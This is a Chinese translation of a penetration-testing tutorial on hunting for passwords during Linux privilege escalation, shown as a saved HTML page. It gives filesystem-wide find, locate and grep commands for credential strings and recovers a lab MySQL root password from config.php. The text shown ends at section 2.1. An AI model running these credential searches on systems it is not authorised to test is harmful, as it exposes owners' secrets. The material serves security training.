<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Linux 提权/Linux 提权-密码搜寻" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Linux 提权-密码搜寻 | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Linux 提权-密码搜寻 | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 Password Hunting – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 Password Hunting – Linux Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed"><link rel="stylesheet" href="/web/assets/css/styles.88380b1f.css">
<script src="/web/assets/js/runtime~main.7c45cfd7.js" defer="defer"></script>
<script src="/web/assets/js/main.0c83e88e.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">软件百宝箱</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/渗透">渗透</a><button aria-label="折叠侧边栏分类 &#x27;渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="折叠侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Linux 提权/Linux 提权-密码搜寻">Linux 提权-密码搜寻</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="展开侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">Linux</a><button aria-label="展开侧边栏分类 &#x27;Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">Windows</a><button aria-label="展开侧边栏分类 &#x27;Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/渗透"><span itemprop="name">渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/linux-提权"><span itemprop="name">Linux 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Linux 提权-密码搜寻</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Linux 提权-密码搜寻</h1></header>
<blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/password-hunting-lpe/" target="_blank" rel="noopener noreferrer">Password Hunting – Linux Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 密码搜寻 – 文件名和文件内容</a>
<ul>
<li><a href="#id1.1">1.1 寻找有趣的文件名</a></li>
<li><a href="#id1.2">1.2 寻找有趣的字符串</a></li>
</ul>
</li>
<li><a href="#id2">2 密码搜寻 – Web 文件/Config 文件</a>
<ul>
<li><a href="#id2.1">2.1 Config 文件中的密码</a></li>
<li><a href="#id2.2">2.2 Web 文件中的密码</a>
<ul>
<li><a href="#id2.2.1">2.2.1 使用 Hashcat 破解密码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id3">3 密码搜寻 – 隐藏文件/文件夹</a>
<ul>
<li><a href="#id3.1">3.1 隐藏文件/文件夹中的密码</a></li>
<li><a href="#id3.2">3.2 Bash 历史文件中的密码</a></li>
<li><a href="#id3.3">3.3 SSH 密钥密码</a>
<ul>
<li><a href="#id3.3.1">3.3.1 使用 John 破解 SSH 密钥密码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#id4">4 密码搜寻 – MySQL</a>
<ul>
<li><a href="#id4.1">4.1 内置数据库中的密码哈希值 – MySQL</a>
<ul>
<li><a href="#id4.1.1">4.1.1 使用 Hashcat 破解 mysql 哈希</a></li>
</ul>
</li>
<li><a href="#id4.2">4.2 自建数据库中的密码哈希值 – MD5</a>
<ul>
<li><a href="#id4.2.1">4.2.1 使用 Hashcat 破解 md5 哈希</a></li>
</ul>
</li>
<li><a href="#id4.3">4.3 自建数据库中的密码哈希值 – Base64</a></li>
</ul>
</li>
<li><a href="#id5">5 密码搜寻 – /var/backups 文件夹</a>
<ul>
<li><a href="#id5.1">5.1 使用 Hashcat 破解 shadow 哈希</a></li>
</ul>
</li>
<li><a href="#id6">6 密码搜寻 – 受密码保护的文件</a>
<ul>
<li><a href="#id6.1">6.1 使用 John 破解 RAR 文件密码</a></li>
</ul>
</li>
<li><a href="#id7">7 自动工具寻找密码 – LinPEAS</a></li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将探讨在目标 Linux 机器上搜寻密码的技巧，以此作为横向或纵向提升权限的一种手段。我们将回顾各种搜寻密码的技术，以及密码存储的一些常见位置。在搜寻过程中，我们将在脚本、配置文件、文件名、哈希值中发现凭证！</p>
<p>用户甚至管理员（root）重复使用他们的密码或将他们的密码留在系统可读的位置是很常见的。</p>
<p>除了系统中随处可见的密码，我们还可以在很多地方找到密码哈希或受密码保护且需要破解的文件。因此，本文将使用 <strong>Hashcat</strong> 和 <strong>John</strong> 进行大量破解。</p>
<blockquote>
<p>当您在系统上发现任何密码时，无论是在初始利用阶段还是后利用阶段，您都必须尽可能地测试该密码！此外，请根据找到的所有用户名测试找到的所有密码，因为密码重复使用是一个大问题，而且非常常见！</p>
</blockquote>
<p>在所有这些示例中，我们都将使用手动技术来查找密码和哈希值。不过，在文章的最后，我们还将看到工具（LinPEAS）在搜寻方面的表现。</p>
<p>我们将在这篇文章中介绍很多内容，让我们直接进入主题吧！</p>
<p>首先，假设我们已找到凭证并以标准用户 <strong>cain</strong> 的身份在目标 Linux 机器上站稳了脚跟。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849202-1431018665-2c6b5f500dbb4a462dd5d9ec8b789bb6.png" width="399" height="136" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1密码搜寻--文件名和文件内容"><strong><div id="id1">1、密码搜寻 – 文件名和文件内容</div></strong><a href="#1密码搜寻--文件名和文件内容" class="hash-link" aria-label="1密码搜寻--文件名和文件内容的直接链接" title="1密码搜寻--文件名和文件内容的直接链接">​</a></h2>
<p>在寻找密码时，我们首先要做的一件事就是进行高级搜索，查找文件名中包含 “password” 的文件。除了文件名之外，我们还应该查找文件中的字符串 “password”。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11寻找有趣的文件名"><strong><div id="id1.1">1.1、寻找有趣的文件名</div></strong><a href="#11寻找有趣的文件名" class="hash-link" aria-label="11寻找有趣的文件名的直接链接" title="11寻找有趣的文件名的直接链接">​</a></h4>
<p>在查找文件系统中文件的 &quot;password&quot; 字符串之前，我们应该先查找包含 &quot;password&quot; 的文件名。此外，我们还应该查找包含我们能想到的任何其他有趣字符串的文件名（config、php 等）。</p>
<p>我们可以使用一些命令来执行此类搜索。</p>
<p>首先，我们可以使用以下 find 命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">find / -exec ls -lad &quot;{}&quot; 2&gt;/dev/null \; | grep -i -I &quot;passw\|pwd&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>上述搜索将非常冗长，需要一些时间才能完成，因为它会检查整个文件系统中是否存在包含字符串 “passw” 或 “pwd” 的文件名。此搜索的好处是 “passw” 涵盖了 passw、passwd 和 password；而 “pwd” 是 password 一词的另一种常见解释。</p>
<p>我们还可以使用另一个命令来梳理整个文件系统以查找名称中包含特定字符串的文件，即 <strong>locate</strong> 命令。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">locate &#x27;passw&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">locate &#x27;pwd&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">locate &#x27;*.php&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>关于 locate 命令最棒的地方在于它运行速度非常快，这使得我们可以在短时间内使用关键字搜索各种不同的文件名/文件类型。</p>
<p>这两种在搜索名称中包含特定字符串文件的方法都会产生大量结果，但如果我们花点时间查看输出结果，可能会发现一些 JUICY 文件（即包含密码的文件）。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="12寻找有趣的字符串"><strong><div id="id1.2">1.2、寻找有趣的字符串</div></strong><a href="#12寻找有趣的字符串" class="hash-link" aria-label="12寻找有趣的字符串的直接链接" title="12寻找有趣的字符串的直接链接">​</a></h4>
<p>我们可以很好地利用 <strong>grep</strong> 命令来在整个文件系统中搜索包含字符串 “passw” 和 “pwd” 的文件；但是，它也会产生大量结果。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep --color=auto -rnw &#x27;/&#x27; -iIe &quot;PASSW\|PASSWD\|PASSWORD\|PWD&quot; --color=always 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这种搜索会用红色显示字符串，用紫色显示完整的文件路径，以及显示在文件中找到该字符串的行号。这种搜索的唯一问题是输出量太大，要解析这些内容需要相当长的时间，所以最好还是执行更精细、更有针对性的搜索。</p>
<p>为了更加精细，我们可以导航到感兴趣的目录，然后运行与上面相同的命令。但这一次，我们将去掉 &quot;/&quot;，这样它就只递归搜索当前目录中的文件。</p>
<p>例如，我们可以导航到通常能找到有趣文件的常用文件夹，如 <strong>/var/www、/tmp、/opt、/home</strong> 等，然后执行以下命令：</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">grep --color=auto -rnw -iIe &quot;PASSW\|PASSWD\|PASSWORD\|PWD&quot; --color=always 2&gt;/dev/null</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849620-2015041672-5141baefbebbd44156903ce4e6811b60.png" width="978" height="63" class="img_ev3q"></p>
<p>通过上述方法，我们能够大大减少结果并快速在 <strong>config.php</strong> 文件中找到了密码。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2密码搜寻--web-文件config-文件"><strong><div id="id2">2、密码搜寻 – Web 文件/Config 文件</div></strong><a href="#2密码搜寻--web-文件config-文件" class="hash-link" aria-label="2密码搜寻--web-文件config-文件的直接链接" title="2密码搜寻--web-文件config-文件的直接链接">​</a></h2>
<p>我们通常会在 webroot 目录中找到凭证（通常是连接 MySQL 数据库的帐户密码）。一般情况下，webroot 目录总是位于 /var/www，其中还包含我们在获得立足点之前使用 gobuster 或 dirb 等工具对子目录进行模糊测试时找到的网页。</p>
<p>通常，我们主要寻找 PHP 配置文件。然而，我们也可以在许多其他可能的文件类型中找到凭据，例如 TXT 文件、bash 脚本、其他脚本、ZIP 文件、其他压缩文件类型（tar、gz 等）、DB 文件等。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21config-文件中的密码"><strong><div id="id2.1">2.1、Config 文件中的密码</div></strong><a href="#21config-文件中的密码" class="hash-link" aria-label="21config-文件中的密码的直接链接" title="21config-文件中的密码的直接链接">​</a></h4>
<p>导航到 <strong>/var/www/</strong> 我们可以看到这里有几个文件，但最引人注目的是 “config.php”。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140849694-1926325493-d5e038c296ad0fec8178ffb9767556b5.png" width="516" height="157" class="img_ev3q"></p>
<blockquote>
<p>请注意，您不会总能找到 “config.php” ，但只需确保查看所有 PHP 文件即可。因为它可能是 db.php、config.php、pwd.php，甚至是随机文件。</p>
</blockquote>
<p>检查 config.php 文件的内容，我们可以看到该文件用于以 root 用户身份访问 MySQL 数据库，文件中还显示了明文用户名和密码！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240717140848458-1407791968-d6d41d20010eb15a21163d61e1fd41cb.png" width="425" height="385" class="img_ev3q"></p>
<p><strong>root：SuperS3cureP@ssw0rd</strong></p>
<p>Amazing！现在，我们应该能够使用这些凭据以 “root” 数据库用户身份进入 MySQL 数据库。但是，并不意味着该凭据也是 shell 的 root 凭据（但也不排除这种可能）！ 因此，进行 <strong>su root</strong> 测试尝试是一个好主意。如果我们真的很幸运，我们将切换用户并进入 root shell。</p>
